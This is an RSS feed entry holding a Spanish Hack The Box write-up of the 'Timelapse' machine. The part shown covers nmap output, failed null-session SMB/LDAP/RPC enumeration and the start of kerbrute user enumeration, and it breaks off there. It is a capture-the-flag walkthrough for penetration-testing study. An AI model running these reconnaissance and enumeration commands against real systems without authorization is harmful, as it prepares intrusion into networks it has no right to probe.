<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>ruby on sckull</title>
    <link>https://sckull.github.io/tags/ruby/</link>
    <description>Recent content in ruby on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 20 Aug 2022 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/ruby/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Timelapse</title>
        <link>https://sckull.github.io/posts/timelapse/</link>
        <pubDate>Sat, 20 Aug 2022 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 20 Aug 2022 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/timelapse/</guid>
        <description>En Timelapse descubrimos un backup de WinRM, este contenia un certificado de autenticación de WinRM, mismo que nos permitió obtener acceso a un primer usuario.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/timelapse/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;En Timelapse descubrimos un backup de WinRM, este contenia un certificado de autenticación de WinRM, mismo que nos permitió obtener acceso a un primer usuario. El historial de PowerShell nos permitió acceder a la contraseña de un segundo usuario. Finalmente observamos que el usuario pertenecia a un grupo relacionado a LAPS, lo cual nos permitió  obtener la contraseña de administrador.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/452&#34;&gt;Timelapse&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.11.152&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/168546&#34;&gt;ctrlzero&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/168546&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[6, 5.4, 4.5, 5.5, 4.6],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[10, 10, 10, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;nmap&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;/code&gt; muestra multiples puertos abiertos: dns (53), kerberos (88), rpc (135), ldap (389), winrm (5986).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.92 scan initiated Tue Mar 29 19:32:52 2022 as: nmap -p53,88,135,139,389,445,593,636,3268,3269,5986,9389,49667,49674,49696,53230 -sV -sC -oN nmap_scan -Pn 10.10.11.152&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.11.152 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.11.152&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.071s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2022-03-30 07:32:57Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: timelapse.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: timelapse.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc01.timelapse.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-10-25T14:05:29
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-10-25T14:25:29
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2022-03-30T07:34:26+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; +7h59m58s from scanner time.
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49674/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc             Microsoft Windows RPC
53230/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2022-03-30T07:33:47
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   3.1.1:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Mar 29 19:34:30 2022 -- 1 IP address (1 host up) scanned in 97.61 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;rpcsmbldap&#34;&gt;RPC/SMB/LDAP&lt;/h2&gt;
&lt;p&gt;Sesiones nulas no nos permitieron obtener informacion por smb, ldap y rpc.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/timelapse ❯ rpcclient -U &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; -N 10.10.11.152
rpcclient $&amp;gt; enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $&amp;gt; enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
 π ~/htb/timelapse ❯
  π ~/htb/timelapse ❯ crackmapexec smb 10.10.11.152 -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; --shares
SMB         10.10.11.152    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:DC01&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:timelapse.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.11.152    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; timelapse.htb&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt; STATUS_ACCESS_DENIED
SMB         10.10.11.152    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt;Access Denied&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; A process has requested access to an object but has not been granted those access rights.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 π ~/htb/timelapse ❯ crackmapexec ldap 10.10.11.152 -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
SMB         10.10.11.152    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:DC01&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:timelapse.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.11.152    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Error in searchRequest -&amp;gt; operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful &lt;span class=&#34;nb&#34;&gt;bind&lt;/span&gt; must be completed on the connection., data 0, v4563
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 π ~/htb/timelapse ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;smb---guest&#34;&gt;SMB - Guest&lt;/h1&gt;
&lt;h2 id=&#34;kerbrute&#34;&gt;Kerbrute&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;kerbrute&lt;/code&gt; para enumerar los usuarios con un pequeño wordlist. Encontramos los usuarios: &lt;code&gt;administrator&lt;/code&gt; y &lt;code&gt;guest&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/timelapse ❯ ./kerbrute userenum --domain timelapse.htb --dc timelapse.htb usernames.txt -t &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; ___/ __ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; ___/ / / / __/ _ &lt;span class=&#34;se&#34;&gt;\
